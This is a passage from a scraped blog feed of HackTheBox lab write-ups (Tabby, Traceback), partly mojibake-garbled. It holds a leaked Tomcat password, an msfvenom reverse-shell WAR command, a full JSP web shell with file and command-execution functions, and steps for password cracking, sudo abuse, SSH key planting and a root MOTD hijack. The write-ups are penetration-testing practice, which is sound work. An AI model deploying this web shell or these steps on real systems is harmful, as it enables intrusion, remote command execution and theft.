encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\r\u0026lt;!--\rLicensed to the Apache Software Foundation (ASF) under one or more\rcontributor license agreements. See the NOTICE file distributed with\rthis work for additional information regarding copyright ownership.\rThe ASF licenses this file to You under the Apache License, Version 2.0\r(the \u0026quot;License\u0026quot;); you may not use this file except in compliance with\rthe License. You may obtain a copy of the License at\rhttp://www.apache.org/licenses/LICENSE-2.0\rUnless required by applicable law or agreed to in writing, software\rdistributed under the License is distributed on an \u0026quot;AS IS\u0026quot; BASIS,\rWITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\rSee the License for the specific language governing permissions and\rlimitations under the License.\r--\u0026gt;\r\u0026lt;tomcat-users xmlns=\u0026quot;http://tomcat.apache.org/xml\u0026quot;\rxmlns:xsi=\u0026quot;http://www.w3.org/2001/XMLSchema-instance\u0026quot;\rxsi:schemaLocation=\u0026quot;http://tomcat.apache.org/xml tomcat-users.xsd\u0026quot;\rversion=\u0026quot;1.0\u0026quot;\u0026gt;\r\u0026lt;!--\rNOTE: By default, no user is included in the \u0026quot;manager-gui\u0026quot; role required\rto operate the \u0026quot;/manager/html\u0026quot; web application. If you wish to use this app,\ryou must define such a user - the username and password are arbitrary. It is\rstrongly recommended that you do NOT use one of the users in the commented out\rsection below since they are intended for use with the examples web\rapplication.\r--\u0026gt;\r\u0026lt;!--\rNOTE: The sample user and role entries below are intended for use with the\rexamples web application. They are wrapped in a comment and thus are ignored\rwhen reading this file. If you wish to configure these users for use with the\rexamples web application, do not forget to remove the \u0026lt;!.. ..\u0026gt; that surrounds\rthem. You will also need to set the passwords to something appropriate.\r--\u0026gt;\r\u0026lt;!--\r\u0026lt;role rolename=\u0026quot;tomcat\u0026quot;/\u0026gt;\r\u0026lt;role rolename=\u0026quot;role1\u0026quot;/\u0026gt;\r\u0026lt;user username=\u0026quot;tomcat\u0026quot; password=\u0026quot;\u0026lt;must-be-changed\u0026gt;\u0026quot; roles=\u0026quot;tomcat\u0026quot;/\u0026gt;\r\u0026lt;user username=\u0026quot;both\u0026quot; password=\u0026quot;\u0026lt;must-be-changed\u0026gt;\u0026quot; roles=\u0026quot;tomcat,role1\u0026quot;/\u0026gt;\r\u0026lt;user username=\u0026quot;role1\u0026quot; password=\u0026quot;\u0026lt;must-be-changed\u0026gt;\u0026quot; roles=\u0026quot;role1\u0026quot;/\u0026gt;\r--\u0026gt;\r\u0026lt;role rolename=\u0026quot;admin-gui\u0026quot;/\u0026gt;\r\u0026lt;role rolename=\u0026quot;manager-script\u0026quot;/\u0026gt;\r\u0026lt;user username=\u0026quot;tomcat\u0026quot; password=\u0026quot;$3cureP4s5w0rd123!\u0026quot; roles=\u0026quot;admin-gui,manager-script\u0026quot;/\u0026gt;\r\u0026lt;/tomcat-users\u0026gt;\rroot@wh1sper:~/HTB/machine/Tabby#\rç„¶ååå°åœ°å€æ˜¯ï¼š 10.10.10.194:8080/manager/ (è¿™ä¸ªç™»å½•ä¸ä¸Š)ï¼Œå¦ä¸€ä¸ªæ˜¯ 10.10.10.194:8080/host-manager/html è¾“å…¥ç”¨æˆ·åtomcatå¯†ç $3cureP4s5w0rd123!å°±å¯ä»¥è¿›å»\næˆ‘ä»¬ç›®çš„æ˜¯Getshellï¼Œä½†æ˜¯è¿™ä¸ªåå°å¹¶ä¸èƒ½æ–‡ä»¶ä¸Šä¼ ï¼Œä½†ä½†æ˜¯tomcatå¯ä»¥ç‹¬ç‰¹åœ°é€šè¿‡å‘½ä»¤è¡Œå»éƒ¨ç½².waråŒ…\nCurlè¿œç¨‹éƒ¨ç½²æ¶æ„waråŒ… åœ¨tomcat-users.xmlä¸­å†™äº†tomcatç”¨æˆ·æ²¡æœ‰manager-guiè§’è‰²ï¼Œå› æ­¤æ— æ³•ç™»å½•manager/htmlé¡µé¢ï¼Œä½†æ˜¯tomcatç”¨æˆ·è¿˜å…·æœ‰manager-scriptè§’è‰²ï¼Œæ‰€ä»¥å¯ä»¥æ‰§è¡Œå‘½ä»¤\ntomcatå‘½ä»¤è¡Œéƒ¨ç½²waråŒ…ï¼šhttps://blog.csdn.net/chumo6161/article/details/100615971\ntomcat manageappæ“ä½œæ–¹æ³•ï¼šhttp://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html\næˆ‘ä»¬ç”¨ä¸€ä¸ªå…æ€jspé©¬æ¥åˆ¶ä½œå¥½waråŒ…ï¼Œç„¶åé€šè¿‡curlè¿œç¨‹éƒ¨ç½²åˆ°é¶æœºä¸Šé¢ï¼š\næˆ‘çš„å…æ€base64ç”¨ä¸äº†ï¼Œæ¢äº†msfçš„é©¬ï¼š\nroot@wh1sper:~/HTB/machine/Tabby# msfvenom -p linux/x86/shell_reverse_tcp lhost=10.10.14.81 lport=10086 -f war -o Formalhaut.war\r[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload\r[-] No arch selected, selecting arch: x86 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 68 bytes\rFinal size of war file: 1538 bytes\rSaved as: Formalhaut.war\rroot@wh1sper:~/HTB/machine/Tabby# ls\rFormalhaut.war JSP.jsp shell.jsp shell.war wh1sper.war\rroot@wh1sper:~/HTB/machine/Tabby# unzip Formalhaut.war Archive: Formalhaut.war\rcreating: META-INF/\rinflating: META-INF/MANIFEST.MF creating: WEB-INF/\rinflating: WEB-INF/web.xml inflating: ubvqchbvesep.jsp root@wh1sper:~/HTB/machine/Tabby#\rç›‘å¬10086ç«¯å£ï¼Œè®¿é—®jspæ–‡ä»¶æˆ‘ä»¬å°±èƒ½æ”¶åˆ°shellï¼š\nåŒç†å¯ä»¥ä¸Šä¼ ä¸€ä¸ªjspèœåˆ€ç‰ˆç”¨èšå‰‘è¿æ¥ä½¿ç”¨å›¾å½¢åŒ–æ–‡ä»¶ç®¡ç†ç³»ç»Ÿï¼š\njspèœåˆ€ç‰ˆ\n\u0026lt;%@page import=\u0026quot;java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\u0026quot;%\u0026gt;\r\u0026lt;%!String Pwd = \u0026quot;pass\u0026quot;;\rString EC(String s, String c) throws Exception {\rreturn s;\r}//new String(s.getBytes(\u0026quot;ISO-8859-1\u0026quot;),c);}\rConnection GC(String s) throws Exception {\rString[] x = s.trim().split(\u0026quot;\\r\\n\u0026quot;);\rClass.forName(x[0].trim()).newInstance();\rConnection c = DriverManager.getConnection(x[1].trim());\rif (x.length \u0026gt; 2) {\rc.setCatalog(x[2].trim());\r}\rreturn c;\r}\rvoid AA(StringBuffer sb) throws Exception {\rFile r[] = File.listRoots();\rfor (int i = 0; i \u0026lt; r.length; i++) {\rsb.append(r[i].toString().substring(0, 2));\r}\r}\rvoid BB(String s, StringBuffer sb) throws Exception {\rFile oF = new File(s), l[] = oF.listFiles();\rString sT, sQ, sF = \u0026quot;\u0026quot;;\rjava.util.Date dt;\rSimpleDateFormat fm = new SimpleDateFormat(\u0026quot;yyyy-MM-dd HH:mm:ss\u0026quot;);\rfor (int i = 0; i \u0026lt; l.length; i++) {\rdt = new java.util.Date(l[i].lastModified());\rsT = fm.format(dt);\rsQ = l[i].canRead() ? \u0026quot;R\u0026quot; : \u0026quot;\u0026quot;;\rsQ += l[i].canWrite() ? \u0026quot; W\u0026quot; : \u0026quot;\u0026quot;;\rif (l[i].isDirectory()) {\rsb.append(l[i].getName() + \u0026quot;/\\t\u0026quot; + sT + \u0026quot;\\t\u0026quot; + l[i].length()\r+ \u0026quot;\\t\u0026quot; + sQ + \u0026quot;\\n\u0026quot;);\r} else {\rsF += l[i].getName() + \u0026quot;\\t\u0026quot; + sT + \u0026quot;\\t\u0026quot; + l[i].length() + \u0026quot;\\t\u0026quot;\r+ sQ + \u0026quot;\\n\u0026quot;;\r}\r}\rsb.append(sF);\r}\rvoid EE(String s) throws Exception {\rFile f = new File(s);\rif (f.isDirectory()) {\rFile x[] = f.listFiles();\rfor (int k = 0; k \u0026lt; x.length; k++) {\rif (!x[k].delete()) {\rEE(x[k].getPath());\r}\r}\r}\rf.delete();\r}\rvoid FF(String s, HttpServletResponse r) throws Exception {\rint n;\rbyte[] b = new byte[512];\rr.reset();\rServletOutputStream os = r.getOutputStream();\rBufferedInputStream is = new BufferedInputStream(new FileInputStream(s));\ros.write((\u0026quot;-\u0026gt;\u0026quot; + \u0026quot;|\u0026quot;).getBytes(), 0, 3);\rwhile ((n = is.read(b, 0, 512)) != -1) {\ros.write(b, 0, n);\r}\ros.write((\u0026quot;|\u0026quot; + \u0026quot;\u0026lt;-\u0026quot;).getBytes(), 0, 3);\ros.close();\ris.close();\r}\rvoid GG(String s, String d) throws Exception {\rString h = \u0026quot;0123456789ABCDEF\u0026quot;;\rint n;\rFile f = new File(s);\rf.createNewFile();\rFileOutputStream os = new FileOutputStream(f);\rfor (int i = 0; i \u0026lt; d.length(); i += 2) {\ros\r.write((h.indexOf(d.charAt(i)) \u0026lt;\u0026lt; 4 | h.indexOf(d\r.charAt(i + 1))));\r}\ros.close();\r}\rvoid HH(String s, String d) throws Exception {\rFile sf = new File(s), df = new File(d);\rif (sf.isDirectory()) {\rif (!df.exists()) {\rdf.mkdir();\r}\rFile z[] = sf.listFiles();\rfor (int j = 0; j \u0026lt; z.length; j++) {\rHH(s + \u0026quot;/\u0026quot; + z[j].getName(), d + \u0026quot;/\u0026quot; + z[j].getName());\r}\r} else {\rFileInputStream is = new FileInputStream(sf);\rFileOutputStream os = new FileOutputStream(df);\rint n;\rbyte[] b = new byte[512];\rwhile ((n = is.read(b, 0, 512)) != -1) {\ros.write(b, 0, n);\r}\ris.close();\ros.close();\r}\r}\rvoid II(String s, String d) throws Exception {\rFile sf = new File(s), df = new File(d);\rsf.renameTo(df);\r}\rvoid JJ(String s) throws Exception {\rFile f = new File(s);\rf.mkdir();\r}\rvoid KK(String s, String t) throws Exception {\rFile f = new File(s);\rSimpleDateFormat fm = new SimpleDateFormat(\u0026quot;yyyy-MM-dd HH:mm:ss\u0026quot;);\rjava.util.Date dt = fm.parse(t);\rf.setLastModified(dt.getTime());\r}\rvoid LL(String s, String d) throws Exception {\rURL u = new URL(s);\rint n;\rFileOutputStream os = new FileOutputStream(d);\rHttpURLConnection h = (HttpURLConnection) u.openConnection();\rInputStream is = h.getInputStream();\rbyte[] b = new byte[512];\rwhile ((n = is.read(b, 0, 512)) != -1) {\ros.write(b, 0, n);\r}\ros.close();\ris.close();\rh.disconnect();\r}\rvoid MM(InputStream is, StringBuffer sb) throws Exception {\rString l;\rBufferedReader br = new BufferedReader(new InputStreamReader(is));\rwhile ((l = br.readLine()) != null) {\rsb.append(l + \u0026quot;\\r\\n\u0026quot;);\r}\r} void NN(String s, StringBuffer sb) throws Exception {\rConnection c = GC(s);\rResultSet r = c.getMetaData().getCatalogs();\rwhile (r.next()) {\rsb.append(r.getString(1) + \u0026quot;\\t\u0026quot;);\r}\rr.close();\rc.close();\r}\rvoid OO(String s, StringBuffer sb) throws Exception {\rConnection c = GC(s);\rString[] t = { \u0026quot;TABLE\u0026quot; };\rResultSet r = c.getMetaData().getTables(null, null, \u0026quot;%\u0026quot;, t);\rwhile (r.next()) {\rsb.append(r.getString(\u0026quot;TABLE_NAME\u0026quot;) + \u0026quot;\\t\u0026quot;);\r}\rr.close();\rc.close();\r}\rvoid PP(String s, StringBuffer sb) throws Exception {\rString[] x = s.trim().split(\u0026quot;\\r\\n\u0026quot;);\rConnection c = GC(s);\rStatement m = c.createStatement(1005, 1007);\rResultSet r = m.executeQuery(\u0026quot;select * from \u0026quot; + x[3]);\rResultSetMetaData d = r.getMetaData();\rfor (int i = 1; i \u0026lt;= d.getColumnCount(); i++) {\rsb.append(d.getColumnName(i) + \u0026quot; (\u0026quot; + d.getColumnTypeName(i)\r+ \u0026quot;)\\t\u0026quot;);\r}\rr.close();\rm.close();\rc.close();\r}\rvoid QQ(String cs, String s, String q, StringBuffer sb) throws Exception {\rint i;\rConnection c = GC(s);\rStatement m = c.createStatement(1005, 1008);\rtry {\rResultSet r = m.executeQuery(q);\rResultSetMetaData d = r.getMetaData();\rint n = d.getColumnCount();\rfor (i = 1; i \u0026lt;= n; i++) {\rsb.append(d.getColumnName(i) + \u0026quot;\\t|\\t\u0026quot;);\r}\rsb.append(\u0026quot;\\r\\n\u0026quot;);\rwhile (r.next()) {\rfor (i = 1; i \u0026lt;= n; i++) {\rsb.append(EC(r.getString(i), cs) + \u0026quot;\\t|\\t\u0026quot;);\r}\rsb.append(\u0026quot;\\r\\n\u0026quot;);\r}\rr.close();\r} catch (Exception e) {\rsb.append(\u0026quot;Result\\t|\\t\\r\\n\u0026quot;);\rtry {\rm.executeUpdate(q);\rsb.append(\u0026quot;Execute Successfully!\\t|\\t\\r\\n\u0026quot;);\r} catch (Exception ee) {\rsb.append(ee.toString() + \u0026quot;\\t|\\t\\r\\n\u0026quot;);\r}\r}\rm.close();\rc.close();\r}%\u0026gt;\r\u0026lt;%\rString cs = request.getParameter(\u0026quot;z0\u0026quot;)==null?\u0026quot;gbk\u0026quot;: request.getParameter(\u0026quot;z0\u0026quot;) + \u0026quot;\u0026quot;;\rrequest.setCharacterEncoding(cs);\rresponse.setContentType(\u0026quot;text/html;charset=\u0026quot; + cs);\rString Z = EC(request.getParameter(Pwd) + \u0026quot;\u0026quot;, cs);\rString z1 = EC(request.getParameter(\u0026quot;z1\u0026quot;) + \u0026quot;\u0026quot;, cs);\rString z2 = EC(request.getParameter(\u0026quot;z2\u0026quot;) + \u0026quot;\u0026quot;, cs);\rStringBuffer sb = new StringBuffer(\u0026quot;\u0026quot;);\rtry {\rsb.append(\u0026quot;-\u0026gt;\u0026quot; + \u0026quot;|\u0026quot;);\rif (Z.equals(\u0026quot;A\u0026quot;)) {\rString s = new File(application.getRealPath(request\r.getRequestURI())).getParent();\rsb.append(s + \u0026quot;\\t\u0026quot;);\rif (!s.substring(0, 1).equals(\u0026quot;/\u0026quot;)) {\rAA(sb);\r}\r} else if (Z.equals(\u0026quot;B\u0026quot;)) {\rBB(z1, sb);\r} else if (Z.equals(\u0026quot;C\u0026quot;)) {\rString l = \u0026quot;\u0026quot;;\rBufferedReader br = new BufferedReader(\rnew InputStreamReader(new FileInputStream(new File(\rz1))));\rwhile ((l = br.readLine()) != null) {\rsb.append(l + \u0026quot;\\r\\n\u0026quot;);\r}\rbr.close();\r} else if (Z.equals(\u0026quot;D\u0026quot;)) {\rBufferedWriter bw = new BufferedWriter(\rnew OutputStreamWriter(new FileOutputStream(\rnew File(z1))));\rbw.write(z2);\rbw.close();\rsb.append(\u0026quot;1\u0026quot;);\r} else if (Z.equals(\u0026quot;E\u0026quot;)) {\rEE(z1);\rsb.append(\u0026quot;1\u0026quot;);\r} else if (Z.equals(\u0026quot;F\u0026quot;)) {\rFF(z1, response);\r} else if (Z.equals(\u0026quot;G\u0026quot;)) {\rGG(z1, z2);\rsb.append(\u0026quot;1\u0026quot;);\r} else if (Z.equals(\u0026quot;H\u0026quot;)) {\rHH(z1, z2);\rsb.append(\u0026quot;1\u0026quot;);\r} else if (Z.equals(\u0026quot;I\u0026quot;)) {\rII(z1, z2);\rsb.append(\u0026quot;1\u0026quot;);\r} else if (Z.equals(\u0026quot;J\u0026quot;)) {\rJJ(z1);\rsb.append(\u0026quot;1\u0026quot;);\r} else if (Z.equals(\u0026quot;K\u0026quot;)) {\rKK(z1, z2);\rsb.append(\u0026quot;1\u0026quot;);\r} else if (Z.equals(\u0026quot;L\u0026quot;)) {\rLL(z1, z2);\rsb.append(\u0026quot;1\u0026quot;);\r} else if (Z.equals(\u0026quot;M\u0026quot;)) {\rString[] c = { z1.substring(2), z1.substring(0, 2), z2 };\rProcess p = Runtime.getRuntime().exec(c);\rMM(p.getInputStream(), sb);\rMM(p.getErrorStream(), sb);\r} else if (Z.equals(\u0026quot;N\u0026quot;)) {\rNN(z1, sb);\r} else if (Z.equals(\u0026quot;O\u0026quot;)) {\rOO(z1, sb);\r} else if (Z.equals(\u0026quot;P\u0026quot;)) {\rPP(z1, sb);\r} else if (Z.equals(\u0026quot;Q\u0026quot;)) {\rQQ(cs, z1, z2, sb);\r}\r} catch (Exception e) {\rsb.append(\u0026quot;ERROR\u0026quot; + \u0026quot;:// \u0026quot; + e.toString());\r}\rsb.append(\u0026quot;|\u0026quot; + \u0026quot;\u0026lt;-\u0026quot;);\rout.print(sb.toString());\r%\u0026gt;\rææƒ çˆ†ç ´webè·¯å¾„å‹ç¼©åŒ…å¯†ç  ç¿»çœ‹ä»–çš„webè·¯å¾„/var/www/htmlï¼Œåœ¨fileæ–‡ä»¶å¤¹ä¸‹æœ‰ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…\nèšå‰‘ä¸‹è½½ä¸‹æ¥æœ¬åœ°ç ´è§£ä¸‹å¯†ç ï¼›\nã€‚ã€‚ã€‚å°è¯•äº†å¾ˆå¤šæ–¹æ³•ï¼Œè·‘äº†å¾ˆä¹…è·‘ä¸å‡ºæ¥ï¼Œï¼Œæœ€åè¿˜æ˜¯å»ç¿»äº†wpï¼Œä½¿ç”¨kaliè‡ªå¸¦çš„/usr/share/wordlists/rockyou.txt.gzå­—å…¸è¿›è¡Œç ´è§£ï¼š\nè§£å‹å­—å…¸ï¼š\nroot@wh1sper:/usr/share/wordlists# ls\rdirb dirbuster fasttrack.txt fern-wifi metasploit nmap.lst rockyou.txt.gz wfuzz\rroot@wh1sper:/usr/share/wordlists# gzip -d rockyou.txt.gz root@wh1sper:/usr/share/wordlists# ls\rdirb dirbuster fasttrack.txt fern-wifi metasploit nmap.lst rockyou.txt wfuzz\rå¼€å§‹çˆ†ç ´ï¼š\nroot@wh1sper:~/HTB/machine/Tabby# john zippass.txt --wordlist=/usr/share/wordlists/rockyou.txt\rUsing default input encoding: UTF-8\rLoaded 1 password hash (PKZIP [32/64])\rWill run 4 OpenMP threads\rPress 'q' or Ctrl-C to abort, almost any other key for status\radmin@it (1.zip)\r1g 0:00:00:00 DONE (2020-07-21 07:47) 1.562g/s 16192Kp/s 16192Kc/s 16192KC/s adnc153..adenabuck\rUse the \u0026quot;--show\u0026quot; option to display all of the cracked passwords reliably\rSession completed\rroot@wh1sper:~/HTB/machine/Tabby#\rï¼Œï¼Œï¼Œç§’å‡ºï¼Œä½¿ç”¨å¯†ç  admin@it è§£å‹ã€‚\nææƒashç”¨æˆ· ä¸è¿‡è§£å‹å‡ºæ¥ä¹‹åæˆ‘ä»¬å¹¶ä¸èƒ½å‘ç°å‹ç¼©åŒ…é‡Œé¢æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œä¹‹å‰è¯»å–/etc/passwdçš„æ—¶å€™æˆ‘ä»¬çœ‹åˆ°äº†æœ‰ä¸ªashç”¨æˆ·ï¼Œäºæ˜¯å°è¯•ç”¨è¿™ä¸ªå¯†ç æ¥ç™»å½•ashç”¨æˆ·ï¼š\nsu ash\rPassword: admin@it\rid\ruid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)\ræœç„¶å¯ä»¥æˆåŠŸï¼/home/user.txtå°±å¯ä»¥æ‹¿åˆ°æ‰‹äº†\n","date":"2020-07-19T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180858.png","permalink":"https://anthem-whisper.github.io/p/hacktheboxtabby/","title":"HackTheBox::Tabby"},{"content":"æ‰“å¼€æ˜¯ä¸€ä¸ªé»‘é¡µ\nçœ‹æºç æœ‰ä¸€å¥hintï¼š\n\u0026lt;!--Some of the best web shells that you might need ;)--\u0026gt;\råˆ©ç”¨å·²æœ‰çš„webshellè·å¾—webadminæƒé™ æ‰«ç›®å½•ï¼Œæ— æœï¼Œå°è¯•ç›´æ¥Googleè¿™å¥è¯ï¼Œæœç„¶æ‰¾åˆ°äº†ä½œè€…çš„Githubï¼Œåœ¨ä½œè€…åˆ—å‡ºçš„ä¸€å †shellé‡Œé¢ä¸€ä¸ªä¸ªå°è¯•ï¼Œæœ€åæ‰¾åˆ°äº†smevk.phpï¼Œç”¨æˆ·å¯†ç adminå°±è¿›å»äº†ï¼Œç„¶åç›´æ¥ä¸Šä¼ æ–‡ä»¶getshellã€‚\nåœ¨/homeç›®å½•ä¸‹å‘ç°ä¸¤ä¸ªæ–‡ä»¶å¤¹ï¼Œå…¶ä¸­sysadminæ²¡æœ‰æƒé™è®¿é—®ï¼Œwebadminé‡Œé¢æœ‰ä¸ªnote.txtï¼š\n- sysadmin -\rI have left a tool to practice Lua.\rI'm sure you know where to find it.\rContact me if you have any question.\rç„¶åæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹webadminçš„.bash_historyï¼š\n.bash_history\nå¥½å§å…¶å®è¿™æ‰æ˜¯åŸç‰ˆï¼š\nls -la\rsudo -l\rnano privesc.lua\rsudo -u sysadmin /home/sysadmin/luvit privesc.lua rm privesc.lua\rlogout\rå¤§æ¦‚å°±æ˜¯é€šè¿‡ /home/sysadmin/luvit è¿™ä¸ªä¸œè¥¿æ¥æ‰§è¡Œluaè„šæœ¬ï¼Œæ‰¾äº†åŠå¤©å¹¶æ²¡æœ‰æ‰¾åˆ°privesc.luaï¼Œæˆ‘ä»¬å¯ä»¥æ–°å»ºä¸€ä¸ªæ¥æ‰§è¡Œï¼Œç”±äºluaå¯ä»¥ç”¨sysadminæƒé™æ‰§è¡Œï¼Œæˆ‘ä»¬å¾—ä»¥è¯»å–/home/sysadmin/user.txtï¼›\næŸ¥çœ‹webadminçš„æƒé™ï¼š\n(webadmin:/var/www/html) $ sudo -l\rMatching Defaults entries for webadmin on traceback:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\rUser webadmin may run the following commands on traceback:\r(sysadmin) NOPASSWD: /home/sysadmin/luvit\r(webadmin:/var/www/html) $\rprivesc.luaï¼š\nos.execute(\u0026quot;ls /home/sysadmin/\u0026quot;)\ros.execute(\u0026quot;cat /home/sysadmin/user.txt\u0026quot;)\rä¸¤æ¬¡åˆ†åˆ«ç”¨èšå‰‘ç»ˆç«¯æ‰§è¡Œï¼š\n(webadmin:/home/webadmin) $ sudo -u sysadmin /home/sysadmin/luvit privesc.lua\rluvit\ruser.txt\r(webadmin:/home/webadmin) $ sudo -u sysadmin /home/sysadmin/luvit privesc.lua\rfaca73f508ba5f752100d6de13500714\r(webadmin:/home/webadmin) $\rå†™å…¬é’¥è·å¾—sysadminçš„SSH è¿è¡Œå‘½ä»¤ç”ŸæˆRASå…¬ç§é’¥å¯¹ï¼š\nssh-keygen -t rsa\rä¿å­˜åˆ°å½“å‰ç›®å½•ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç”Ÿæˆäº†ä¸¤ä¸ªæ–‡ä»¶ï¼š\nroot@wh1sper:~/HTB/machine/Traceback# ls -a\r. .. id_rsa id_rsa.pub pspy64 pspy64s unix-privesc-check unix-privesc-check.tar\rroot@wh1sper:~/HTB/machine/Traceback#\rå…¶ä¸­ id_rsa.pub æ˜¯å…¬é’¥ï¼Œæˆ‘ä»¬åˆ©ç”¨webshellæŠŠä»–ä¸Šä¼ åˆ° /home/username/.ssh/authorized_keys è¿™ä¸ªæ–‡ä»¶é‡Œé¢å°±å¯ä»¥è·å¾—è¿™ä¸ªuserçš„æƒé™ã€‚\næ—¢ç„¶luaè„šæœ¬å¯ä»¥è¯»å†™sysadminçš„ç›®å½•ï¼Œæˆ‘ä»¬ä¾¿åˆ©ç”¨ä»–å†™sysadminçš„å…¬é’¥ï¼š\néšåæ‰§è¡Œå‘½ä»¤ï¼Œç”¨ç§é’¥ç™»å½•SSHï¼š\nssh -i id_rsa sysadmin@10.10.10.181\rå¯ä»¥çœ‹åˆ°æˆ‘ä»¬æ˜¯sysadminäº†ã€‚\nåˆ©ç”¨pspyå·¥å…·åœ¨æ²¡æœ‰rootçš„æƒ…å†µä¸‹ç›‘è§†é«˜æƒé™è¿›ç¨‹ pspyå·¥å…·åœ°å€ï¼š\nhttps://github.com/DominicBreuker/pspy\nhttps://github.com/Tib3rius/pspy\nåˆ©ç”¨webshellä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œåœ¨å½“å‰ç›®å½•æ‰§è¡Œï¼š\n./pspy64 å¯ä»¥çœ‹åˆ°\næ ‡æœºå™¨æ¯30ç§’ä¼šæ‰§è¡Œä¸€ä¸ªcpå‘½ä»¤ï¼ŒæŠŠä¸€äº›æ–‡ä»¶ä»backupç›®å½•å¤åˆ¶åˆ°/etc/update-motd.d/\n/bin/sh -c /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/\ræˆ‘ä»¬å»æŸ¥çœ‹è¿™ä¸ªç›®å½•ä¸‹æœ‰ä»€ä¹ˆä¸œè¥¿ï¼š\n$ cd /etc/update-motd.d/\r$ pwd\r/etc/update-motd.d\r$ ls\r00-header 10-help-text 50-motd-news 80-esm 91-release-upgrade\r$ cat 00-header\r#!/bin/sh\r#\r# 00-header - create the header of the MOTD\r# Copyright (C) 2009-2010 Canonical Ltd.\r#\r# Authors: Dustin Kirkland \u0026lt;kirkland@canonical.com\u0026gt;\r#\r# This program is free software; you can redistribute it and/or modify\r# it under the terms of the GNU General Public License as published by\r# the Free Software Foundation; either version 2 of the License, or\r# (at your option) any later version.\r#\r# This program is distributed in the hope that it will be useful,\r# but WITHOUT ANY WARRANTY; without even the implied warranty of\r# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\r# GNU General Public License for more details.\r#\r# You should have received a copy of the GNU General Public License along\r# with this program; if not, write to the Free Software Foundation, Inc.,\r# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\r[ -r /etc/lsb-release ] \u0026amp;\u0026amp; . /etc/lsb-release\recho \u0026quot;\\nWelcome to Xh4H land \\n\u0026quot;\r$ æ˜¯ä¸æ˜¯å¾ˆç†Ÿæ‚‰å‘¢ï¼Ÿåœ¨åˆšåˆšç™»å½•çš„æ—¶å€™ä¹Ÿæ˜¯è§åˆ°äº†è¿™å¥è¯ï¼š Welcome to Xh4H land\néšåæˆ‘ä»¬ç›‘è§†åˆ°ï¼Œæ¯æ¬¡ç™»å½•SSHéƒ½ä¼šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\nå…¶ä¸­èƒ½æ‰¾åˆ°è¿™æ ·ä¸€æ¡ï¼š\nCMD: UID=0 PID=2007 | /bin/sh /etc/update-motd.d/00-header\råˆ©ç”¨rootæƒé™è¿è¡Œçš„è„šæœ¬å¼¹shell ç›®çš„å¾ˆæ˜ç¡®äº†ï¼Œè¿™ä¸ª00-headerè„šæœ¬æ˜¯ç”¨rootæ‰§è¡Œçš„ï¼Œæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼š\n$ echo 'id' \u0026gt;\u0026gt; 00-header\r$ exit\rroot@wh1sper:~/HTB/machine/Traceback# ssh -i id_rsa sysadmin@10.10.10.181\r#################################\r-------- OWNED BY XH4H ---------\r- I guess stuff could have been configured better ^^ -\r#################################\rWelcome to Xh4H land uid=0(root) gid=0(root) groups=0(root)\rFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\rLast login: Sat Jul 18 02:23:33 2020 from 10.10.14.98\r$\ridè¢«æ‰§è¡Œäº†ã€‚ä¸è¿‡è¿™ä¸ª00-headeræ–‡ä»¶å¥½åƒä¸€ç›´åœ¨è¢«è¿˜åŸï¼Œæ‰‹é€Ÿè¦å¿«ã€‚\nå¼¹ä¹‹ï¼š\nmdèœœæ±ç¯å¢ƒå¼¹ä¸è¿‡æ¥\nåæ­£æˆ‘ä»¬çŸ¥é“/root/root.txtï¼Œç›´æ¥echo 'cat /root/root.txt' \u0026gt;\u0026gt; 00-header\nç„¶åç™»å½•å°±èƒ½çœ‹åˆ°äº†ï¼š\necho 'cat /root/root.txt' \u0026gt;\u0026gt; 00-headerroot@wh1sper:~/HTB/machine/Traceback# ssh -i id_rsa sysadmin@10.10.10.181\r#################################\r-------- OWNED BY XH4H ---------\r- I guess stuff could have been configured better ^^ -\r#################################\rWelcome to Xh4H land 96c02bb36b51b8f45d59482a4b0c1aba\rFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\rLast login: Sat Jul 18 02:31:58 2020 from 10.10.14.98\r$\rç¯å¢ƒä¸€ç›´æœ‰äººæ…å±ã€‚ã€‚ã€‚å»ºè®®åœ¨ç¾å›½æ™šä¸Šçš„æ—¶å€™æ‰“\n","date":"2020-07-17T00:00:00Z","image":"https://cdn.jsdelivr.net/gh/Anthem-whisper/imgbed@main/img/20210120180751.png","permalink":"https://anthem-whisper.github.io/p/hacktheboxtraceback/","title":"HackTheBox::Traceback"},{"content":"ç©ä¸€æ‰‹HTB\n æ‰“å¼€é¶æœºå°±ä¸€äº›æ— å…³ç´§è¦çš„æ–‡å­—ï¼Œdirsearchæ‰«ä¸€ä¸‹ç›®å½•å¯ä»¥æ‰«åˆ°ç™»å½•åå°ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°é¶æœºä½¿ç”¨äº† Bludit cms\nåœ¨çœ‹äº†ä¸€äº›Bluditçš„æ¼æ´ä¹‹åï¼Œå‘ç°åœ¨æ²¡æœ‰ç™»å½•ã€æˆ‘ä»¬åˆåªæœ‰ä¸€ä¸ªåå°åœ°å€çš„æƒ…å†µä¸‹ï¼Œå¼±å£ä»¤æ¯”è¾ƒé è°±\nCVE-2019-17240 Bluditæ˜¯ä¸€å¥—å¼€æºçš„è½»é‡çº§åšå®¢å†…å®¹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ã€‚\nBludit 